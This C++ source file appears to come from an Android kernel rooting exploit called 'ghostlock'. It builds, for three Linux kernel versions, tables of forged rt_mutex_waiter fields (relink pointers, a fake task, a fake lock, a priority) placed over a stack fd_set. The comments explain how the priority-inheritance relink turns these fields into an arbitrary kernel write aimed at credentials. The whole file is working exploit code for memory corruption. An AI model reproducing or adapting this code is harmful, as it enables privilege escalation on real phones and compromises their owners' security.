#include "route/route_api.hpp"

#include <iterator>

#include "kernel/waiter_layout.hpp"

/* The per-layout fd_set word table, kept in its own translation unit so it stays
 * host-safe: it needs the layout ordinals and nothing from the Android-only
 * headers, so the fixed host tests can assert every layout without a race, a
 * profile or kernel memory. */
namespace ghostlock::route {
    namespace {
        size_t copy_waiter_words(
            const WaiterWord *source, size_t count, WaiterWord *out,
            size_t capacity) {
            if (!out || capacity < count) {
                return 0;
            }
            for (size_t i = 0; i < count; i++) {
                out[i] = source[i];
            }
            return count;
        }
    } // namespace

    size_t select_stack_waiter_words(
        uint8_t compact_waiter, uintptr_t target, uintptr_t fake_right,
        uintptr_t fake_task, uintptr_t fake_lock, WaiterWord *out,
        size_t capacity) noexcept {
        const uint64_t write_target = static_cast<uint64_t>(target);
        const uint64_t right = static_cast<uint64_t>(fake_right);
        const uint64_t task = static_cast<uint64_t>(fake_task);
        const uint64_t lock = static_cast<uint64_t>(fake_lock);

        /* A leaf write (WriteRequest::leaf, preserve_child == 0) leaves
         * PayloadWriteLayout::right at zero, because there is no child cred to
         * point the relink at. pc = 0 would leave the node parentless for
         * enqueue_pi to trash fake_task, so the contract uses pc = dest - 8
         * instead: the one-child arm then stores 0 at *dest. That is also what
         * encode_compact_waiter() writes into pi_tree_entry (0x18 =
         * layout.parent = target - 8, 0x20 = layout.right = 0, 0x28 =
         * layout.left). layout.left is never assigned anywhere, so the
         * zero-value arm relinks left at 0. */
        const uint64_t relink_pc = right != 0 ? right : write_target - 8;
        const uint64_t relink_left = right != 0 ? write_target : 0;

        if (compact_waiter == kernel::COMPACT_WAITER_5_10) {
            /* 5.10 compact rt_mutex_waiter: no wake_state and no ww_ctx, so prio
             * sits directly at 0x40 and the structure ends at 0x50. Word 12
             * (0x50) is inside the neighbouring fd_set word on 6.1 only; writing
             * it here would clobber a descriptor slot that has no waiter meaning
             * on 5.10. */
            const WaiterWord words_5_10[] = {
                {2, relink_pc, "tree_pc"},
                {3, 0, "tree_right"},
                {4, relink_left, "tree_left"},
                {5, relink_pc, "pi_pc"},
                {6, 0, "pi_right"},
                {7, relink_left, "pi_left"},
                {8, task, "task"},
                {9, lock, "lock"},
                {10, static_cast<uint64_t>(kernel::FAKE_WAITER_PRIO), "prio"},
                {11, 0, "deadline"},
            };
            return copy_waiter_words(
                words_5_10, std::size(words_5_10), out, capacity);
        }

        if (compact_waiter != 0) {
            /* 6.1 compact write route (Root-My-Pixel-Payloads src/61/fops.c):
             * tree/pi parents carry the write value, children the write target;
             * waiter->task is the payload fake_task (planted fields for the PI
             * walk). */
            const WaiterWord words_6_1[] = {
                {2, right, "tree_pc"},
                {3, 0, "tree_right"},
                {4, write_target, "tree_left"},
                {5, right, "pi_pc"},
                {6, 0, "pi_right"},
                {7, write_target, "pi_left"},
                {8, task, "task"},
                {9, lock, "lock"},
                {10, (static_cast<uint64_t>(kernel::FAKE_WAITER_PRIO) << 32) |
                         static_cast<uint64_t>(3),
                 "wake_prio"},
                {11, 0, "deadline"},
                {12, 0, "ww_ctx"},
            };
            return copy_waiter_words(
                words_6_1, std::size(words_6_1), out, capacity);
        }

        /* 6.6 rt_mutex_waiter with rb_node tree/pi_tree */
        const WaiterWord words_6_6[] = {
            {2, 0, "tree_pc"},
            {3, 0, "tree_right"},
            {4, 0, "tree_left"},
            {5, 1, "tree_prio"},
            {6, 0, "tree_deadline"},
            {7, 0, "pi_parent"},
            {8, 0, "pi_right"},
            {9, 0, "pi_left"},
            {10, 1, "pi_prio"},
            {11, 0, "pi_deadline"},
            {12, task, "task"},
            {13, lock, "lock"},
            {14, 3, "wake_state"},
        };
        return copy_waiter_words(words_6_6, std::size(words_6_6), out, capacity);
    }
} // namespace ghostlock::route
